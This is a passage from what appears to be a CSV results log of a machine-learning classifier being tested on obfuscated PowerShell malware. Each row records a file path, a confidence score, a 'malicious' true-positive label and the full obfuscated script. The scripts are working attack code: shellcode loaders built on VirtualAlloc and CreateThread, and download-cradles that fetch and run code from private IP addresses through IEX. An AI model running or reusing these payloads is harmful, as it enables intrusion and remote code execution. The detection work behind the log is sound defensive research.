60};','0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x98,0xa1,0x65,0x68,0x02,0x00,0x99,0x26,0x89,0xe6,0x6a,0',',0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,','0x57,0x6',',0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,')).RePlaCE('nzw',[StriNg][CHaR]39).RePlaCE(([CHaR]70+[CHaR]117+[CHaR]108),'$').RePlaCE('RBo',[StriNg][CHaR]34))",malicious,TP
2026-07-13 17:16:14,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3761.ps1,custom-ps-ml,UNKNOWN,59dc5713-9b5e-4d8a-83b7-0d49ae28dfcb,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,1563,2140.82,"(((\""{45}{54}{7}{50}{33}{74}{56}{2}{29}{37}{28}{95}{36}{108}{44}{111}{49}{71}{97}{105}{20}{72}{113}{27}{104}{38}{89}{26}{91}{75}{52}{59}{11}{51}{98}{92}{82}{24}{70}{21}{63}{22}{102}{99}{76}{65}{46}{57}{17}{48}{79}{112}{3}{32}{100}{1}{81}{109}{16}{114}{115}{23}{68}{106}{6}{15}{25}{84}{10}{86}{88}{94}{62}{4}{77}{53}{96}{61}{9}{85}{80}{12}{67}{30}{42}{18}{41}{39}{14}{19}{34}{78}{107}{0}{43}{5}{103}{110}{13}{66}{73}{60}{101}{87}{93}{64}{31}{55}{8}{90}{58}{83}{47}{35}{69}{40}\""-f '80/index.as','OX',';te','w','578e','M','YSTem.NeT.C','E','E','d5a0b15','ULTNe','k',';[cHar[','N%{t','htt','reDEntIALCAcHE]:','R','sT]::DEFAUl','.DownLOAdSTrinG(M','p://192.168.','nt','p,te',');','aLS','9pUser-',':D','1','.','l','Yu=u9','ChAr[','t','C.','sT','8.1','Inu9pu','/5.','pMozi','r','w',')','C',']](teYwc','p','W','teY','.NET.WEBREQu','jo','tWEbPr','ow','ct Sy','ou9p','like','966fb2','wc=NEW-Obj','eYK.L','t.WEbCLIEnT','e','H]};IEX',' Gec','te','e','8f9','Yu','%','EM','e',']]teYB=([',' ','9p','Agentu9','s NT 6.1;','/','Y_-bXOR','EM.Ne',' ','[SYsT','2','03:8','ox','teYi=0','Y','dErS.ADD(u',' (teYb-','Efa','a4531cu9p;','T','eYI+','WorkCREdEnTial','v:','nGt','1.0)','teYwc.HeA','+','S;teYK=u9pe','la','fa1',' ',';','Xy = ','PR','YK[t','teYwC.Pro','Cw)))n','0; ','WOW64; Tride','= [S','0','0 (','.C','t','ind','Y;teY','7','E','denTi')) -ReplACE ([cHAR]110+[cHAR]116+[cHAR]78),[cHAR]124  -ReplACE  ([cHAR]117+[cHAR]57+[cHAR]112),[cHAR]39  -CReplaCE([cHAR]77+[cHAR]67+[cHAR]119),[cHAR]34 -CReplaCE  ([cHAR]116+[cHAR]101+[cHAR]89),[cHAR]36)| &amp;( $PSHoMe[4]+$PSHOME[30]+'x')",malicious,TP
2026-07-13 17:16:21,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3765.ps1,custom-ps-ml,UNKNOWN,1dd3a59f-a636-4db2-ab08-70fca02abb1f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2906,2047.17," ((\""{42}{38}{2}{27}{22}{17}{24}{7}{34}{41}{48}{36}{4}{25}{35}{13}{15}{30}{9}{44}{26}{37}{32}{0}{14}{12}{43}{18}{46}{16}{40}{47}{1}{6}{28}{31}{11}{23}{20}{19}{33}{8}{3}{45}{5}{10}{29}{39}{21}\"" -f '0x3d,0xfb,0xea,0x1',',0x9c,0xc2,0x13,0x9f,0x29,0x24,0x43,0x4f,0x7',' flProtect','f (w','d,0x29,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x83,0xc5,0x04,0x','g,0x40);for (wOsi=0;wOsi -le (wOsz.Length-1','a,0xf9,0x23,0x3f,0x3a,0xa9,0xcb,0x55,0xb5,0x96,0xeb,0x55,0x1f,0xbf,0x81,0xb9,0xf6,0x9','ount);FHl;wOsw = Add-Type -memberDefinition wOsW9n','d,0xe4,0x6e,0xcf,0x16,0x8d,0x8c,0x36,0x50,0x12,0x6e,0x1d,0x60,0x6e,0xb9,0x5b,0x16,0x9e,0x79;wOsg = 0x1000;i','x1d,0xe1,0x7f,0x90,0x5c,0x36,0xa0,0xa9,0xae,0x4b,0xa1,0xee,0xd3,0xa6,0xf3,0xa7,0x98,0x15,0xe',');wOsi++) {wOsw','x46,0','0x8','6,0x56,0x39,0xf5,0xde,0x14,0xc2,0x06,0x1e,0x79,0x4a,0xe3,0x2f,0xb9,0x28,0','2,0xdb,0x88,0xe0,0xdf,0xaf,0xd7,0xe4,0xde,0x7c,0x6c,0x10,0x6a,','x67,0x1f,0x09,0x3a,0x25,0x93,0xe2,0x6e,0xde,0x20,0x86,0xa6,0xd1,0x81,0x2d,0x91,0xdc,0x12','af,0x94,0xc3,0x8a,0x2f,0xb3,0x54,0xf8,0x1d,0x1c,','imsvcrt.dllNmi)]public static',',0xa0,0x67,0xfa,0xeb,0xc9,0x3e,0xa6,0x5a,0xf5,0x21,0x09,0x02,0x53,0x29,0xa7,0x57,0xee,0','1,0x28,0xdb,0x36,0','x50,0xfc,0x28,0xe0,0x50,0xfc,0x7e,0x6a,0x51,0x94,0x26,0xce,0x02,0x8','z.ToInt32()+wOsi), wOsz[wOsi], 1)};wOsw::CreateThread(0,0,wOsRiQz,0,0,0);for (;;){Start-sleep 60};','ntPtr lpThreadId);[DllImport(Nm','x5f,0xc2,0x3f,0x7c,0xca,0xea,0xd5,0x7b,0x5d,0xbd,0x41,0x86,0xb8,0x89,0xcd,0x79,0xef,0x82,0xc4,0xef,0',' extern IntPtr memset(IntPtr dest, uint src, uint c','03','5,0xa5,0x8f,0x9e,0xf8,0xad,0x6c,0x56,0xfa,0x9',');[DllImport(Nmikernel32.dllNmi)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, I','7,0x3d,0x23,0x53,0x63,0xdc,0xac,0x49,0x09,0xde,0x27,0x7e,0xed','::memset([IntPt',',0',',0x90,0xcf,0x0b,0xfd,0x44,0x20,0','0x97,0xd3,0xbf,0xea,0x58,0x7f,0xfe,0xc3,0xaa,0x81,0xc6,0xe3,0x54,0xf4,0x3e,0x10,0xe8,0x0f,0x85,0x6b,0x36,0x85,0x1e,0xcb,0xbd,','x1a,0xb',' -Name N',',0x7d,0x3','9,0x74,0x24,0xf4,0x5','c,0x22,0xed,0xa5,0x3e,0xc4,0x22,0xde,0x76,0xde,0x27,0xdb,0xc1,0x55,0x93,','pAddress, uint dwSize, uint flAllocationType, uint','r](wOsRiQ','0xcf,','miWin32Nmi -namespace Win32F','wOsW9n = FHl[DllImport(Nmikernel32.dllNmi)]public static extern IntPtr VirtualAlloc(IntPtr l','3,0xa3,0x91,0x28','4,0xcc,0xd','Osz.Length -gt 0x1000){wOsg = wOsz.Length};wOsRiQz=wOsw::VirtualAlloc(0,0x1000,wOs','x70,0x','0x96,0x2d,0xd5,0xc9,0x61,0x52,0xcc,0xae,0xfe,0xad,0xef,0xce,0xd7,0x69,0xbb,0x9e,0x4f,0x58,0xc4,0x74,0x90,0x65,0x11,0xe0,0x95,0xf1,0x5a,0x5d,0xb9,0x00,0x33','unctions -passthru;[Byte[]];[Byte[]]wOsz = 0xda,0xdf,0xbf,0x22,0xb4,0xcc,0x09,0xd')).REpLACE(([cHAR]119+[cHAR]79+[cHAR]115),[sTriNG][cHAR]36).REpLACE('Nmi',[sTriNG][cHAR]34).REpLACE(([cHAR]70+[cHAR]72+[cHAR]108),[sTriNG][cHAR]39)|iNvoKe-ExPreSsIOn",malicious,TP
2026-07-13 17:16:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3777.ps1,custom-ps-ml,UNKNOWN,742ecff1-1116-4018-a064-3d26051a9b10,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1621,2107.29," &amp; ( $ENV:CoMSPeC[4,26,25]-JoIn'')( ((\""{89}{6}{28}{19}{126}{79}{23}{117}{102}{34}{91}{98}{92}{122}{103}{114}{10}{70}{50}{40}{90}{0}{111}{99}{1}{86}{25}{71}{38}{37}{35}{87}{74}{123}{108}{51}{80}{13}{18}{112}{43}{72}{14}{20}{107}{82}{95}{120}{7}{36}{21}{101}{116}{62}{67}{8}{29}{75}{54}{66}{83}{60}{9}{78}{118}{42}{3}{88}{104}{57}{30}{45}{109}{93}{96}{58}{69}{52}{46}{47}{64}{124}{110}{121}{100}{17}{48}{11}{125}{53}{24}{26}{15}{5}{94}{68}{81}{44}{77}{31}{97}{56}{127}{73}{12}{16}{85}{113}{22}{105}{119}{76}{2}{49}{4}{41}{61}{63}{32}{59}{65}{84}{33}{39}{128}{27}{55}{106}{115}\""-f'0; ','k','_-BX','.','Wk','([chAR[]]','Ob','E','T]::','e',' ','4','htt','GU','oX','=','p://19','10e0db','t,zEWu)','eCT','Y','Ne','x','t;z','z','eckoGUt','EWi=0;[CHaR[]]zEWb','GU','J','DEFAuLtW','hE]:','ST','h]};','B','M','C.H','m.','EWw','z','-J','7','[zEWi','SYsteM.Net','WwC.','Oa',':DE',';','z','5e','oRzE','rident/','(GUtUser-Agen','Ls','Ut;','r','tGU','i','iALCAC','Red','IEX (','wc.PRoXY.CR','++%zE','qU','Wk.LENgT','EWK=','zE','oXY;z','eS','EWwC.Down','eNtIa','WOW64; T',';','PR','r9E','DER','EBP','BH%{zEW','D','DEn','LieN','t','L','[','EW','W','2.168.8.56:2222/i','e G','ea','CR','zEWWC=NEW-','.','ozilla/5.0 (',' N','AuL','(z','SY','tNeTwORkC','R','Windows','i','a','t.WebR','Ut','6.','eDEnt','.aspr9','t',' = ','.AdD','F','ce4','rv:11.0) l',';zE','nde','1;',')','e','EWu=G','tIalS = [','E)))8','st','10c124','T ','s','GUtc51','b97fc2af39G',' SysTeM.NeT.WEbC','nG(','oIn')).rePlace(([char]122+[char]69+[char]87),[STrINg][char]36).rePlace('r9E',[STrINg][char]34).rePlace('GUt',[STrINg][char]39).rePlace('8BH',[STrINg][char]124) )",malicious,TP
2026-07-13 17:16:40,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3795.ps1,custom-ps-ml,UNKNOWN,6d343020-642e-4cce-9ee3-68c9a97f2362,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2821,1995.85," (((\""{36}{41}{43}{18}{30}{39}{45}{33}{6}{1}{23}{8}{0}{11}{31}{2}{48}{15}{27}{16}{37}{4}{42}{5}{13}{24}{19}{29}{12}{17}{40}{21}{22}{35}{10}{46}{38}{7}{9}{20}{25}{47}{44}{34}{14}{26}{28}{3}{32}\""-f 'ic static e','dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)','ce Win32Functions -passthru;[Byte[]];[Byte[]]DPOz ','DPOg,0x40);for (DPOi=0','4,0x',',0xb9','dAttributes, uint ','f3,0x94,0xeb,0x1f,0x66,0x57,0x83,0x5f,0x66,0x57,0x53,0x36,0xec,0x57,0x3b,0xee,0',']publ','x54,0x04,0x5e,0xf1,0x40,0x38,0xf3,0x64,0x6b,0','0x08,0xfa,0xcd,0x41,0x9d,0x01,0x4','xtern IntPtr memset(IntPtr dest, uint src, uint c','0xf3,0xbb,0xf8,0xf5,0',',0x20,0x7c,0xed,0x32,0x7a,0x90,0x75,0xa6,0xca,0x93,0x54,0x79,0x41,0xca,0x76,0x7b,0x86,0x66,0x3f,0x63,0xcb,0x43,0x','ength -gt 0x1000){DPOg','x4b,0x04,0xbf,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x18,0x83,0xc0,0x04,0x03,0x70,0x9','a,0xbb,0x82,0xd0,0x73,0x5e,0xb3,0xd0,0xe0,0x2a,0xe3,0xe0,0x63,0x7e,0x0f,0x8a,0x26,0x','x47,0x98,0xdc,0x5e,0x13,0x81,0x45,0x3a,0xf2,0xbe,0x96,0xe5,0xab,0x1a,0xdc,0x0b,0xbf,0x16,0xbf,0x43,0x0c,0x1b,0x40,0x93,0x1a,0x2c,0x33,0xa1,0x85,0x86,0xdb,0x89,0x4e,0x01,0x1b,0xee,0x64,0xf5,0xb3,0x11,0x87,0x06,0x9d,0xd5,0xd3,0x56,0xb5,0xfc,0x5b,0x3d,0x45,0x01,0x8e,0xa8,0x40,0x95,0x6e,0xda,0x36,0x91,0xf9,0x26,0xc9,0x48,0xa6,0xaf,0x2f,0x3a,0x06,0xe0,0xff,0xfa,0xf6,0x40,0x50,0x92,0x1c,0x4f,0x8f,0x82,0x1e,0x85,0xb8,0x28,0xf1,0x70,0x90,0','ze, uint flAllocationType, uint flProtect);[DllImp',',0xac,0xcc,0x8b,0x74,0x51,0xd7,0x4f,0x07,0x8d,0x52,0x54,0xaf,0x46,0xc4,0xb0,0x4e,0x8a,0x93,0x33,0x5c,0x67,0xd7,0x1c,0x40,0x76,0x34,0x1','x69,0xa0,0x2f,0x03','7,0x16,0xb5,0xfe,0xf4,0xe7,0x','7b,0xf7,0x71',';[DllImport(yWSmsvcrt.dllyWS)','89,0x18,0x3f,0x3f,0x08,0xc9,0x0e,0xc0,0xa7,0x34,0xbf,0x33,0xb9,0x71,0x07',',0x97,0x9f,0x18,0x8c,0x68,0xca,0x98,0xf0',' = DPOz.Length};DPOpxl=DPOw::VirtualAlloc(0','2,0xa9,0xf1,0x43,0x72,0xaf,0xf',',0x1000,','7,0x7c,','ort(yWSkernel32.dllyWS)]public static extern I','ount);T0c;DPOw = Add-Type -memberDefinition DPOfVQ -Name yWSWin32yWS -namespa',';DPOi -le (DPOz.Length-1);DPOi++) {DPOw::memset([IntPtr](DPOpxl.ToInt32()+DPOi), DPOz[DPOi], 1)};DPOw::CreateThread(0,0,DPOpxl,0,0,0);for (;;){Start-sleep 60};','hread(IntPtr lpThrea','.L',',0xf4,0xeb,0xf7,0xcf,0xa6,0xbd,','DPOfVQ = T0c[DllImport(yWSkerne','6b,0x8','96,0x','ntPtr Create','xc4,0x68,0xd9,0x6a,0x75,0x74,0xf','l32.dllyWS)]','fe,0xee,0x9c,0x2d,0xb4,0xc8,0x93,0xae,0xe5,0x29,0xb5,0x2c,0xf4,0x7d,0x15,0x0d,0x37,0x70,0x54,0x4a,0x2a,0x79,0x04,0x03,0x20,0x2c','public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSi',';DPOg = 0x1000;if (DPOz','T','4,0x16,0x09,0x08,0xb1,0x50,0x',',0xbe,0x32,0xef,0x18,0x03','= 0xdb,0xcc,0xbe,0x86,0'))  -CrEPlaCe 'DPO',[cHAR]36 -ReplACe  'T0c',[cHAR]39-CrEPlaCe'yWS',[cHAR]34) | iEX",malicious,TP
2026-07-13 17:16:54,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\380.ps1,custom-ps-ml,UNKNOWN,fa5a0a71-23cd-46ee-8888-2b59a4cb3847,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3083,2633.48,"((\""{32}{63}{10}{47}{9}{39}{45}{31}{40}{42}{62}{26}{64}{25}{51}{8}{44}{19}{59}{6}{55}{5}{17}{56}{3}{61}{0}{65}{49}{21}{69}{23}{33}{54}{28}{13}{24}{34}{57}{29}{41}{58}{68}{16}{1}{20}{43}{18}{71}{48}{66}{38}{37}{67}{70}{27}{7}{4}{22}{12}{35}{52}{2}{30}{60}{14}{50}{53}{46}{15}{36}{11}\"" -f'x99,0x76,0xc5,0x69,0x88,0x28,0x5e,0x30,0x0a,0xca,0xb3,0x48,0x03,0xd4,0xd','2,0xac,0','0xe7,0x8f,',',0x09,0xa6,0x16,0x01,0x5c,0xa7,0x5f,0x7c,0xad,0xf5,0x08,0x0a,0x00,0xea,0x3d,0x46,0',',0xbc,0x65,0xd4,0x84,0x6c,','x79,0xee,0x96,0x37,0x2f,0x02,0x5c,0x15,0xc4,0x91,0x10,0','c,0x26,',',0xa0,0xab,0x9d,0x72,0x8c,0x25,0x7b,0x24','1,0x75,0x14,0x03,0x75,0x85,0xc3,0x2d,0xf3,0','c static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(e3bmsvcrt.dlle3b)]public static extern IntPtr memse','Ptr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(e3bk','ToInt32()+j8Li), j8Lz[j8Li], 1)};j8Lw::CreateThread(0,0,j8LAIjr,0,0,0);for (;;){Start-sleep 60};','cc,0xde,0x1e,0xa7,0x87,0x7f,0xde,0x7d,0xe2,0xbf,','x2f,0x28,0x','0x06,','j','xe','xb2,0xeb,0x12,0x9','0','0x47,0xe9,0','xef,0x',',0x01,0xdc,0xb9,0x7b,0xe','0xc6,0x84,0x6c,0x67,0xc9,0xfb,0x8c,0x88,0x03,0x94,0x26,0x67,0xfa,0x','x73,0x84,0xb4,0x19,0x8d,0xc0,0x7','c1,0x5b','0xb1,0x47,0x83,0xc5,0x04,0',' Win32','3,0x60,0xc8,0xa9,0x9d,0x73','5b,0x8e,0xe4,0x5a,0','x28,0xea,0x27,0x9a,0x95,0x4e,0','0xb0,0x1c,0x9f,0x8d,0xe5,0x6a,0x00,0x6d,0xc0,0xe1,0x89,0xfb,0xab,0x9d,0xf5,0xeb,0x2b,0x5','i;j8Lw = Add-Type -memb','j8LLCPw = fbi[DllImport(e3bkernel32.dlle3b)]public stati','2,0xc2,0xf8,0x38,0',',0xfc,0xaf,0x82,0x57,0x49,0xbb,0xcd,0x7b,0x4c,0x68,0x66,0x87,0xc5,0x8f,0xa9,0x0e,0x9d,0xab,0x6d,0x4b,0x45,0xd5,0x34,0x31,','0x54,0x72,0x12,0x71,0x9d,0xff,0x00,0xe5,0x6d,0x4a,0x7a,0xa3,0x72,0x60,0x11','8Lz.Length -gt 0x1000){j8Lg = j8Lz.Length};j8LAIjr=j8Lw::VirtualAlloc(0,0x1000,j8Lg,0x40);for (j8Li=0;j8Li -le (j8Lz.Length-1);j8Li++) {j8Lw::memset([IntPtr](j8LAIjr.','6,0xe7,0','x8a,0x45,0xc9,0x31,0x41,0x96,0xf','t(IntPtr dest, uint sr','erDef','x23,','inition j8LLCPw -Name','f2,0x6c,','x4d,0x81,0xce,0x0c,0x8d,0xe6,','c, uint count);fb',' = 0x1000;if (','ernel32.dlle3b)]publi',',0x52,0x99,0xe4,0x1a,0x5d,0xda,0x2d,0','0x22','0x93,0xfc,0x2e,0x7a,0x42,0x38,0x45,0x92,0x56;j','x3',',0x4b,','8Lg','x81,0x7f,0xfb,0xfe,0xf8,0x','0x33,0','e,0xe4,0xc2,0xa3,0xb3,0xd5,0x45,0x27,0xce','0','0x36,0xc1,0xe2','xb','d,0xa0,0x61,0x2c,0x35,0x14,0xd2,0x7f,0x20,0x5b,0xcf,0x13,0xf9,0xce,0xf0,0x45,0xae,0x59,0x99,0x6b,0x89,0xae,','x99,0x81,0x0d,0x46,0',' e3bWin32e3b -namespace','c extern IntPtr VirtualAlloc(Int','Functions -passthru;[Byte[]];[Byte[]]j8Lz = 0xdd,0xc1,0xbe,0x91,0x21,0xd8,0x0f,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,','0,0x75,0xdd,0x6f,','xd8,0x09,0','x',',0x6e,0x5e,0x26,0xcf,0x90,0x9e,0x20,0x58,0','a,0','fc,0x9','x9c,0x78,0xdd,0x6b,0xe3')).replACe(([CHaR]101+[CHaR]51+[CHaR]98),[StRiNG][CHaR]34).replACe(([CHaR]106+[CHaR]56+[CHaR]76),'$').replACe('fbi',[StRiNG][CHaR]39) |&amp; ((VarIABLe '*mDr*').namE[3,11,2]-JoiN'')",malicious,TP
2026-07-13 17:17:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3830.ps1,custom-ps-ml,UNKNOWN,238cf517-2cda-436f-88f2-af43bc7dfa09,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2778,2094.1,"&amp; ( $shELLID[1]+$sHELlId[13]+'X')( (((\""{46}{10}{0}{26}{37}{45}{15}{7}{2}{44}{24}{17}{19}{23}{29}{38}{31}{6}{12}{11}{21}{30}{4}{33}{9}{5}{16}{22}{41}{3}{36}{18}{35}{40}{1}{39}{28}{20}{25}{42}{34}{27}{32}{43}{8}{13}{14}\"" -f'c(IntPtr lpAddress, uint dwSize, uint flAllocatio','68,0x02,0x00,0x01,0','lpThreadId);[DllImport(Zdqmsvcrt.dllZdq)]public static extern IntPtr memset(IntPtr',',0x5d,0x68,0x33,0x32,0x00,0x00,0','0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x','x24,0x01,0xd3,0x66,0','0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb','ameter, uint dwCreationFlags, IntPtr ','z.Length-1);Kj3i++) {Kj3w::mems','x24,0x75,0xe2,0x58,0x8b,0x58,0',' IntPtr VirtualAllo','x3c,0x61,0','7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0','et([IntPtr](Kj3BuBW.ToInt32()+Kj3i), Kj3z[Kj3i], 1)};Kj3w::CreateThread(0,0,Kj3BuBW',',0,0,0);for (;;){Start-sleep 60};','ize, IntPtr lpStartAddress, IntPtr lpPar','x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,',' -','x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,','namespace Win32Functions -passt','00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd','x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52','0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x','hru;[Byte[]];[Byte[]]K','32Zdq','5,0x93,0x53,0x6a,0x00,0x56,0','nType, uint flProtect);[DllImport(Zdqkernel32.dl','c6,0x85,0xf6,0x75,0xec,',',0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x','j3z = 0xfc,0xe8,0x8',',0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,','b,0x52,0x30,0x8b,','0xc3;Kj3g = 0x1000;if (Kj3z.Length -gt 0x1000){Kj3g = Kj3z.Length};Kj3BuBW=Kj3w::VirtualAlloc(0,0x1000,Kj3g,0x40);for (Kj','7d,0','0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0x','0x97,0x6a,0x05,0x68,0xc0,0x','x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0','lZdq)]public static extern IntPtr CreateThread(IntPtr lpThre','9,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8','xbb,0x89,0xe6,0x6a','a8,0xd9,0x80,0x','24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86','x53,0x57,0x68,0x02,0xd9,','3i=0;Kj3i -le (Kj3',' dest, uint src, uint count);Db7;Kj3w = Add-Type -memberDefinition Kj3tnNG -Name ZdqWin','adAttributes, uint dwStackS','Kj3tnNG = Db7[DllImport(Zdqkernel32.dllZdq)]public static extern'))  -CREPLACE([ChAr]68+[ChAr]98+[ChAr]55),[ChAr]39 -CREPLACE'Kj3',[ChAr]36  -rEPlAce'Zdq',[ChAr]34) )",malicious,TP
2026-07-13 17:17:21,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3832.ps1,custom-ps-ml,UNKNOWN,8269d0e8-b554-43c3-8e21-ef51fc1a241d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1511,1628.0," INvoKe-exprEsSIon ((((\""{36}{24}{0}{29}{39}{101}{14}{2}{7}{56}{89}{60}{28}{18}{23}{105}{27}{25}{79}{30}{120}{86}{9}{73}{76}{102}{11}{57}{61}{6}{98}{84}{53}{110}{3}{44}{71}{94}{38}{8}{106}{90}{67}{68}{64}{116}{66}{59}{32}{82}{58}{96}{70}{49}{54}{112}{119}{114}{16}{13}{20}{26}{21}{15}{10}{43}{87}{50}{118}{117}{113}{80}{31}{93}{62}{1}{47}{115}{41}{33}{88}{107}{5}{97}{108}{95}{55}{12}{72}{92}{19}{46}{34}{74}{48}{103}{51}{99}{63}{111}{83}{65}{77}{42}{35}{37}{69}{91}{100}{109}{104}{75}{85}{17}{22}{52}{40}{45}{78}{81}{4}\""-f '=New-O','CReDEn','bCL','RS.A','-JoIn7db7db)','4','e','ie','ent7',' ','.','7.0; rv:11.','i=0;','ed','m.Net.WE','.NeT','.Cr','I++%','Moz','r[','ENTials ','SYStEm','gvGk.','i','GwC',' N','= [','(Windows','db','Bj',' 6.1','T','N','afc','[ChAr[]](','68.118.129:','gv','8080/index.asp','Ag','eCT SY','ENgTh]};','24','1','CREdeNTialCAC','DD(','IEX ',']]gvGB=(','tIal','Gwc.DoWN',']::DefAulT',']','oadStrING(','L','7db;gvGwC.H','W','G','nt;g','0) l','BReQ','STeM.','7','ik','twork','G',' = ','ttp://','SY','PrOX','y','BGz)','t','7','[','Tride','gv','RgvGk[','n','192.','(','T','L','gvGB','Et.We','h','Gecko','gvG','WOW64;','He','8bc8','vGu=','u);gvGWc.',')','Cha','NE','dbUser-','171c57db;gv','UEs','e7ff',' ','B',')','StE','t/','l','G_-BXo','lla/5.0 ','db,gvG','0e548d66c','72','bmG%{gv','EadE','z','eB','U','Y;gvGWC.PrOXY','S;gvGK=7db7b','[',':Defa',':','ProX','; ')) -CrepLacE([CHAR]103+[CHAR]118+[CHAR]71),[CHAR]36  -rEPlACE 'bmG',[CHAR]124-rEPlACE '7db',[CHAR]39  -rEPlACE'BGz',[CHAR]34))",malicious,TP
2026-07-13 17:17:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3845.ps1,custom-ps-ml,UNKNOWN,4f9be0a3-13c8-4f89-b85d-06807c4addfd,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,2906,1590.97,"&amp;( $pShOmE[4]+$PsHome[34]+'x')( (((\""{11}{48}{27}{45}{1}{21}{25}{44}{2}{37}{24}{38}{18}{35}{31}{39}{43}{40}{14}{0}{5}{46}{28}{33}{7}{36}{32}{8}{41}{34}{29}{30}{6}{13}{22}{17}{4}{42}{12}{10}{26}{16}{20}{23}{9}{19}{15}{3}{47}\"" -f '2,0xfb,0x1d,0x93,0x52,0x9c,0x94,0x76,0x63,0x9c,0xc3,0xf3,0xd3,0x2c,0x87,','rn In','otect);[DllImport(o1Ekernel32.dllo1E)]public static extern IntPtr CreateThread(IntPtr lpTh','i++) {AlRw::memset([IntPtr](AlR6u5c.ToInt32()+AlRi), AlRz[AlRi],','5,0xb6,0x3e','0x5','x79,0xdc,0x8c,0xa7,','0,0xc8,0xc8,0x1b,0x4a,0xdc,0x48,0xff,0x1a,0xdf,0x79,0xae,0x11,0x86,0','05,0xaa,0x70,0x37,0xd1,0x3f,0x63,0x9f,0x92,0x98,0x4f,0x1e,0x76,0x7e,0x1b,0x2c,0x33,0xf4,0x43,0x30,0xc2,0xd9,0xff,0x4','le (','11,0xbc,0x96,0xc7','AlRLQ6C =','0xdd,0x18,0x44,0xf6,0x1e,0x4f,0xdf,0x3f,0x8b,0x30,0xb7,0x3f,0x5b,0xb1,0x47,0x16,0x31,0xb1,0x2f,0xce,0x61,0xe2,0x4a,0x','0x11,0x1c,0x31,0x72,0x8f,0x19,0xa5,0xbd,0xf8,0x22,0x3f,0x56,0xfb,0x22,0','xba,0x56,0x97,0x27,0x96,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x42,0x75,0xd2,0x6a,0x8','R','xcf,0xb4,0x0f,0x28,0xed,0xe3,0x78,0xf7,0x0e,0xc6,0x78,0xcb,0xd8,0x2e,0x0f,0x25,0xd9;AlRg = ',',0x3c,0x1a,0x7','adId);[DllImport(o1Emsvcrt.dllo1E)]public static exte','AlRz.Length-1);Al','0x10','tPtr VirtualAlloc(In','x20,0x36,0x72,0xc4,0x0e,0x66,0xd5,0x59,0xee,0xd6,0x95,0x09,0x86','00;if (AlRz.Length -gt 0x1000){AlRg = AlRz.Length};AlR6u5c=AlRw::VirtualAlloc(0,0x1000,AlRg,0x40);for (AlRi=0;AlRi -',' IntPtr lpStartAddress, Int','tPtr 